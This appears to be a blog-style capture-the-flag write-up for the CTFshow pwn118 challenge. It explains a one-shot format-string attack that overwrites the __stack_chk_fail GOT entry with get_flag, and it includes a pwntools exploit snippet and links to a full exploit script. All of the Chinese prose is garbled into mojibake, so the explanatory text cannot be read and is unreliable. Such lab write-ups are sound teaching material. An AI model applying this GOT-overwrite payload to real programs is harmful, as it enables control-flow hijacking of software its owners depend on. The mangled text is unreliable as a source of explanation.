---
title: CTFshow pwn118 鏍煎紡鍖栧瓧绗︿覆鏀?GOT
published: 2026-04-17
updated: 2026-04-17
description: 鍙湁涓€娆¤緭鍏ユ満浼氭椂锛屼笉鍐嶅厛 leak canary锛岃€屾槸鐩存帴鎶?__stack_chk_fail@got 鏀瑰埌 get_flag銆
tags: [CTFshow, Pwn, Stack, Format String, GOT Hijack]
category: ctfshow
draft: false
---

# 棰樼洰缁撹

鍥犱负杩欓鍙粰涓€娆¤鍏ユ満浼氾紝鎵€浠?pwn115 / pwn116 閭ｇ鈥滃厛 leak 鍐嶇浜屾婧㈠嚭鈥濈殑鎵撴硶璧颁笉閫氥€?
鏇寸洿鎺ョ殑鍋氭硶鏄敤鏍煎紡鍖栧瓧绗︿覆涓€娆℃€ф妸 `__stack_chk_fail@got` 鏀规垚 `get_flag`銆傝繖鏍风▼搴忎竴鏃﹁蛋鍒版爤淇濇姢澶辫触璺緞锛屽疄闄呰皟鐢ㄧ殑灏变笉鏄姤閿欏嚱鏁帮紝鑰屾槸鐩爣鍑芥暟銆?
## 鍏抽敭 exp 鐗囨

```python
stackcheck = elf.got['__stack_chk_fail']
get_flag = elf.sym['get_flag']
payload = fmtstr_payload(7, {stackcheck: get_flag})
payload = payload.ljust(0x50, b'a')
p.sendline(payload)
```

杩欓閲屾渶閲嶈鐨勬暟瀛楁槸鏍煎紡鍖栧瓧绗︿覆鍋忕Щ `7`銆?
## 涓嬭浇

- [涓嬭浇棰樼洰闄勪欢 `pwn`](../../attachments/ctfshow/pwn118/pwn)
- [涓嬭浇鍒╃敤鑴氭湰 `exp.py`](../../attachments/ctfshow/pwn118/exp.py)
- [涓嬭浇鍘熷绗旇 `Bypass_pwn118.md`](../../attachments/ctfshow/pwn118/Bypass_pwn118.md)

## 閫傚悎璁颁綇鐨勭偣

鈥滃彧鏈変竴娆¤緭鍏ユ満浼氣€濇椂锛岃浼樺厛鑰冭檻鍗曞彂鎵撴硶锛?
- GOT 瑕嗗啓
- 杩斿洖鍦板潃鐩磋烦
- 涓€娆℃€у啓瀹岀殑鏍煎紡鍖栧瓧绗︿覆鍒╃敤


